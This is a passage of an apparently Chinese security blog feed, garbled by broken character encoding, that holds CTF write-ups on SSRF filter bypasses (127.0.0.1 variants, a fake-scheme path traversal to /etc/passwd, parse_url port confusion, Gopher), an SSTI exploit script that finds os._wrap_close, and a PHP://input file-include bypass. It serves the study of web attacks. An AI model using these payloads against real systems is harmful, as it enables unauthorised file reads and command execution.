href="https://4m.cn/">https://4m.cn/</a></p><p>4.å„ç§æŒ‡å‘127.0.0.1çš„åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/         # localhostå°±æ˜¯ä»£æŒ‡127.0.0.1</span><br><span class="line">http://0/                 # 0åœ¨windowä¸‹ä»£è¡¨0.0.0.0ï¼Œè€Œåœ¨liunxä¸‹ä»£è¡¨127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/    # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ</span><br><span class="line">http://[::]:80/           # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ</span><br><span class="line">http://127ã€‚0ã€‚0ã€‚1/       # ç”¨ä¸­æ–‡å¥å·ç»•è¿‡</span><br><span class="line">http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ # 0çš„æ•°é‡å¤šä¸€ç‚¹å°‘ä¸€ç‚¹éƒ½æ²¡å½±å“ï¼Œæœ€åè¿˜æ˜¯ä¼šæŒ‡å‘127.0.0.1</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡æŒ‡å®šçš„åè®®å¤´</p><p>file_get_contents()å‡½æ•°çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå³å½“PHPçš„file_get_contents()å‡½æ•°åœ¨é‡åˆ°ä¸è®¤è¯†çš„åè®®å¤´æ—¶å€™ä¼šå°†è¿™ä¸ªåè®®å¤´å½“åšæ–‡ä»¶å¤¹ï¼Œé€ æˆç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè¿™æ—¶å€™åªéœ€ä¸æ–­å¾€ä¸Šè·³è½¬ç›®å½•å³å¯è¯»åˆ°æ ¹ç›®å½•çš„æ–‡ä»¶ã€‚ï¼ˆinclude()å‡½æ•°ä¹Ÿæœ‰ç±»ä¼¼çš„ç‰¹æ€§ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// ssrf.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(!preg_match(&#x27;/^https/is&#x27;,$_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">die(&quot;no hack&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents($_GET[&#x27;url&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç é™åˆ¶äº†urlåªèƒ½æ˜¯ä»¥httpså¼€å¤´çš„è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpsssss://</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶file_get_contents()å‡½æ•°é‡åˆ°äº†ä¸è®¤è¯†çš„ä¼ªåè®®å¤´â€œhttpsssss:&#x2F;&#x2F;â€ï¼Œå°±ä¼šå°†ä»–å½“åšæ–‡ä»¶å¤¹ï¼Œç„¶åå†é…åˆç›®å½•ç©¿è¶Šå³å¯è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=httpsssss://../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>###URLè§£æå·®å¼‚</p><p>1.readfileå’Œparse_userå‡½æ•°è§£æå·®å¼‚ç»•è¿‡æŒ‡å®šç«¯å£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span>. <span class="variable">$_GET</span>[url];</span><br><span class="line"><span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$parsed</span>[port] == <span class="number">80</span> )&#123;  <span class="comment">// è¿™é‡Œé™åˆ¶äº†æˆ‘ä»¬ä¼ è¿‡å»çš„urlåªèƒ½æ˜¯80ç«¯å£çš„</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç é™åˆ¶äº†æˆ‘ä»¬ä¼ è¿‡å»çš„urlåªèƒ½æ˜¯80ç«¯å£çš„ï¼Œä½†å¦‚æœæˆ‘ä»¬æƒ³å»è¯»å–11211ç«¯å£çš„æ–‡ä»¶çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php</span><br><span class="line">    </span><br><span class="line">    ?url=<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">11211</span>:<span class="number">80</span>/flag.txt</span><br></pre></td></tr></table></figure><p>å¯ä»¥æˆåŠŸè¯»å–11211ç«¯å£flag.txtæ–‡ä»¶ï¼ŒåŸç†å¦‚ä¸‹å›¾</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190451055.png" alt="image-20230712190451055"></p><p>ä¸¤ä¸ªå‡½æ•°è§£æhostä¹Ÿå­˜åœ¨å·®å¼‚</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/cc15c26e93dfaac450eaa31c71c8d40a.jpeg" alt="1610601347_5fffd383dfc1a3982425f.png!small?1610601348433"></p><p><strong>2.åˆ©ç”¨curlå’Œparse_urlçš„è§£æå·®å¼‚ç»•è¿‡æŒ‡å®šhost</strong></p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190638172.png" alt="image-20230712190638172"></p><h3 id="Gopheråè®®"><a href="#Gopheråè®®" class="headerlink" title="Gopheråè®®"></a>Gopheråè®®</h3><p>Gopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œå®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œå¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨TCP 70ç«¯å£</p><p>Gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæˆªè·GETè¯·æ±‚åŒ…å’ŒPOSTè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆGopheråè®®è¯·æ±‚çš„payloadè¿›è¡ŒSSRFåˆ©ç”¨ï¼Œç”šè‡³å¯ä»¥ç”¨å®ƒæ¥æ”»å‡»å†…ç½‘ä¸­çš„Redisã€MySqlã€FastCGIç­‰åº”ç”¨ï¼Œè¿™æ— ç–‘å¤§å¤§æ‰©å±•äº†æˆ‘ä»¬çš„SSRFæ”»å‡»é¢</p><p>Gopheråè®®æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸è¦å¿˜è®°åé¢é‚£ä¸ªä¸‹åˆ’çº¿â€<em>â€œï¼Œä¸‹åˆ’çº¿â€</em>â€œåé¢æ‰å¼€å§‹æ¥TCPæ•°æ®æµï¼Œå¦‚æœä¸åŠ è¿™ä¸ªâ€_â€ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯æ”¶åˆ°çš„æ¶ˆæ¯å°†ä¸æ˜¯å®Œæ•´çš„ï¼Œè¯¥å­—ç¬¦å¯éšæ„å†™ã€‚</p><p>å¦‚æœå‘èµ·POSTè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨%0d%0aæ¥ä»£æ›¿%0aï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„&amp;ä¹Ÿéœ€è¦è¿›è¡ŒURLç¼–ç </p><p>åˆ©ç”¨Gopheråè®®å‘é€HTTPè¯·æ±‚æ­¥éª¤</p><p>åœ¨gopheråè®®ä¸­å‘é€HTTPçš„æ•°æ®ï¼Œéœ€è¦ä»¥ä¸‹ä¸‰æ­¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.æŠ“å–æˆ–æ„é€ HTTPæ•°æ®åŒ…</span><br><span class="line">2.URLç¼–ç ã€å°†å›è½¦æ¢è¡Œç¬¦%0aæ›¿æ¢ä¸º%0d%0a</span><br><span class="line">3.å‘é€ç¬¦åˆgopheråè®®æ ¼å¼çš„è¯·æ±‚</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™å‡ ä¸ªé—®é¢˜ï¼š</p><pre><code>é—®å·ï¼ˆ?ï¼‰éœ€è¦è½¬ç ä¸ºURLç¼–ç ï¼Œä¹Ÿå°±æ˜¯%3få›è½¦æ¢è¡Œè¦å˜ä¸º%0d%0a,ä½†å¦‚æœç›´æ¥ç”¨å·¥å…·è½¬ï¼Œå¯èƒ½åªä¼šæœ‰%0aåœ¨HTTPåŒ…çš„æœ€åè¦åŠ %0d%0aï¼Œä»£è¡¨æ¶ˆæ¯ç»“æŸï¼ˆå…·ä½“å¯ç ”ç©¶HTTPåŒ…ç»“æŸï¼‰</code></pre><h1 id="HNCTF-2022-WEEK2-ez-ssrf"><a href="#HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf"></a>[HNCTF 2022 WEEK2]ez_ssrf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç æ¥å—é€šè¿‡ GET è¯·æ±‚ä¼ é€’çš„å‚æ•°ï¼Œå¹¶ä½¿ç”¨ <code>fsockopen()</code> å‡½æ•°å»ºç«‹ä¸æŒ‡å®šä¸»æœºå’Œç«¯å£çš„ socket è¿æ¥ã€‚ç„¶åï¼Œå®ƒå°†ä¼ å…¥çš„ base64 ç¼–ç çš„æ•°æ®è§£ç ï¼Œå¹¶å°†æ•°æ®å†™å…¥åˆ°è¿æ¥çš„ socket ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œåœ¨å¾ªç¯ä¸­ï¼Œå®ƒä»è¿æ¥ä¸­è¯»å–è¿”å›çš„å“åº”æ•°æ®ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°æµè§ˆå™¨ã€‚</p><p>è¯·æ³¨æ„ï¼Œè¿™æ®µä»£ç å­˜åœ¨ä¸€äº›å®‰å…¨é£é™©ï¼š</p><ol><li>æ²¡æœ‰å¯¹è¾“å…¥å‚æ•°è¿›è¡Œä»»ä½•éªŒè¯å’Œè¿‡æ»¤ã€‚è¿™å¯èƒ½å¯¼è‡´å®‰å…¨æ¼æ´ï¼Œå¦‚è¿œç¨‹å‘½ä»¤æ‰§è¡Œå’Œä»£ç æ³¨å…¥æ”»å‡»ï¼Œè¯·åŠ¡å¿…åŠ ä»¥éªŒè¯å’Œè¿‡æ»¤ç”¨æˆ·è¾“å…¥ã€‚</li><li>å…³é—­ <code>error_reporting</code>ï¼Œè¿™ä¼šéšè—ä»»ä½•å¯èƒ½çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿å¾—è°ƒè¯•å’Œé”™è¯¯å¤„ç†å˜å¾—å›°éš¾ï¼Œå»ºè®®åœ¨å¼€å‘å’Œæµ‹è¯•é˜¶æ®µå¯ç”¨é”™è¯¯æŠ¥å‘Šä»¥åŠé€‚å½“çš„é”™è¯¯å¤„ç†ã€‚</li></ol><p>å»ºè®®å¯¹è¯¥ä»£ç è¿›è¡Œæ”¹è¿›å’Œå¢å¼ºï¼Œä»¥æé«˜å®‰å…¨æ€§å’Œä»£ç å¯é æ€§ã€‚</p><p>** <code>fsockopen()</code> å‡½æ•°æ˜¯ç”¨äºå»ºç«‹ä¸€ä¸ª socket è¿æ¥ã€‚è¯¥å‡½æ•°çš„å‚æ•°åŒ…æ‹¬ï¼š</p><ul><li><code>$host</code>ï¼šè¦è¿æ¥çš„ä¸»æœºåæˆ– IP åœ°å€ã€‚</li><li><code>intval($port)</code>ï¼šè¦è¿æ¥çš„ç«¯å£å·ï¼Œå…¶ä¸­ <code>intval()</code> å‡½æ•°å°†ç«¯å£å·è½¬æ¢ä¸ºæ•´æ•°ã€‚</li><li><code>$error</code>ï¼šä¸€ä¸ªä¼ å…¥å‚æ•°ï¼Œç”¨äºè·å–é”™è¯¯ä»£ç ï¼ˆå¦‚æœæœ‰é”™è¯¯å‘ç”Ÿï¼‰ã€‚</li><li><code>$errstr</code>ï¼šä¸€ä¸ªä¼ å…¥å‚æ•°ï¼Œç”¨äºè·å–é”™è¯¯æè¿°ä¿¡æ¯ï¼ˆå¦‚æœæœ‰é”™è¯¯å‘ç”Ÿï¼‰ã€‚</li><li><code>30</code>ï¼šè¶…æ—¶æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ã€‚****</li></ul><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>é¦–å…ˆæœ¬åœ°æ„é€ ä¸€ä¸ªæ–‡ä»¶ï¼Œè®©ä»–è·³è½¬åˆ°127.0.0.1ï¼Œç”¨æ¥ä¼ªé€ è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$out = &quot;GET /flag.php HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Host: 127.0.0.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Connection: Keep-Alive\r\n\r\n&quot;;</span><br><span class="line">echo $out;</span><br><span class="line">echo base64_encode($out)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘è¦å°†è¿™ä¸€æ®µä¿¡æ¯é€šè¿‡fwriteå†™è¿›æˆ‘ä»¬çš„ä¼šè¯ä¸­çš„ï¼Œè¿™äº›å°±æ˜¯è¯·æ±‚å¤´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.wrox.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712195039783.png" alt="image-20230712195039783"></p><p>æ‰‹å†™ä¸€ä¸ª127.0.0.1çš„è¯·æ±‚å¤´æ ¼å¼ï¼Œbase64ç¼–ç ä¸€ä¸‹å°±å¥½</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712201519214.png" alt="image-20230712201519214"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playloadï¼šï¼Ÿhost=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022 WEEK2  ez_SSTI</title>
      <link href="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/"/>
      <url>/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2-ez-SSTI"><a href="#HNCTF-2022-WEEK2-ez-SSTI" class="headerlink" title="HNCTF 2022 WEEK2  ez_SSTI"></a>HNCTF 2022 WEEK2  ez_SSTI</h1><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721095059045-1700990353927-179-1700994545908-153.png"></p><h1 id="WELCOME-TO-HNCTF"><a href="#WELCOME-TO-HNCTF" class="headerlink" title="WELCOME TO HNCTF"></a>WELCOME TO HNCTF</h1><p>ä»Šå¤©æ¥åšä¸€ä¸‹<strong>WELCOME TO HNCTF</strong></p><p>æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªé“¾æ¥ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œè·³è½¬åˆ°åˆ«çš„åœ°æ–¹å»äº†ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå­˜åœ¨sstiæ³¨å…¥æ¼æ´</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721095310676-1700990353927-180-1700994545908-155.png"></p><p>è·‘å‡ºæ¥äº†æ‰€æœ‰çš„ç±»</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721100049475-1700990353927-181-1700994545908-154.png"></p><p>æˆ‘ä»¬å»æ‰¾æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„osæ¨¡å—åœ¨ç¬¬å‡ ä¸ªï¼Œç”¨è„šæœ¬å»è·‘</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721100029882-1700990353927-182-1700994545908-156.png"></p><p>é™„è·‘sstiæ¨¡å—çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://node2.anna.nssctf.cn:28081/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:    //æƒ³åˆ©ç”¨çš„æ¨¡å—åå¯ä»¥æ¢</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥è¿™é‡Œç”¨osæ¨¡å—ä¸­çš„popen()æ¥æ‰§è¡Œå‘½ä»¤</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721101152276-1700990353927-184-1700994545908-157.png"></p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721101047957-1700990353927-183-1700994545908-158.png"></p><p>æ€»ç»“ï¼šä¸€äº›åŸºç¡€é­”æœ¯æ–¹æ³•çš„åˆ©ç”¨ï¼Œæœªå‘ç°è¿‡æ»¤ï¼ŒåŸºç¡€é¢˜</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Php_include</title>
      <link href="/2023/07/20/php-include/"/>
      <url>/2023/07/20/php-include/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹æºç ï¼Œç»•è¿‡ä¸¤ä¸ªå‡½æ•°æ‹¿åˆ°åŠ¨æ€flagï¼Œä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ–‡ä»¶åŒ…å«</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªå‡½æ•°<strong>strstrï¼ˆï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€strstr() å‡½æ•°æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ã€‚å¦‚æœæ˜¯ï¼Œè¿”å›å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å›falseã€‚</span><br><span class="line"><span class="number">2</span>ã€æ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ç¬¬ä¸€æ¬¡åŒ¹é…çš„å­—ç¬¦ä¸²çš„åœ°å€ï¼›</span><br></pre></td></tr></table></figure><p>str_replace()å‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•ï¼š<br> <strong>ä»¥å…¶å®ƒå­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</strong><br> è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br></pre></td></tr></table></figure><p> find,å¿…éœ€ï¼Œè¦æŸ¥æ‰¾çš„å€¼<br> replaceï¼Œå¿…éœ€ï¼Œè¦æ›¿æ¢çš„å€¼<br> stringï¼Œå¿…éœ€ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²<br> countï¼Œå¯é€‰ï¼Œæ›¿æ¢æ¬¡æ•°</p><p>åœ¨è¿™ä¸ªé¢˜ç›®ä¸­ï¼Œå°±æ˜¯åŒ¹é…pageå˜é‡ä¸­çš„php:&#x2F;&#x2F;æ›¿æ¢ä¸ºç©º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;     <span class="comment">//æŸ¥æ‰¾pageä¸­çš„phpï¼š//ï¼Œè‹¥å­˜åœ¨åˆ™è¿”å›ä¸ºç©º</span></span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>); <span class="comment">//åŒ¹é…pageå˜é‡ä¸­çš„php://æ›¿æ¢ä¸ºç©º</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•1ï¼ˆå¤§å°å†™ç»•è¿‡ï¼‰ï¼š"><a href="#æ–¹æ³•1ï¼ˆå¤§å°å†™ç»•è¿‡ï¼‰ï¼š" class="headerlink" title="æ–¹æ³•1ï¼ˆå¤§å°å†™ç»•è¿‡ï¼‰ï¼š"></a><strong>æ–¹æ³•1ï¼ˆå¤§å°å†™ç»•è¿‡ï¼‰ï¼š</strong></h2><p>åˆ©ç”¨phpä¼ªåè®®å¤§å°å†™ç»•è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=PHP://input</span><br></pre></td></tr></table></figure><p>å…ˆgetä¼ è¿›å»</p><p><img src="/2023/07/20/php-include/image/image-20230720200207233-1700990453114-251.png"></p><p>ä¹‹åå†™å‘½ä»¤æ‰§è¡Œ</p><p><img src="/2023/07/20/php-include/image/image-20230720200246031-1700990453114-252.png"></p><h2 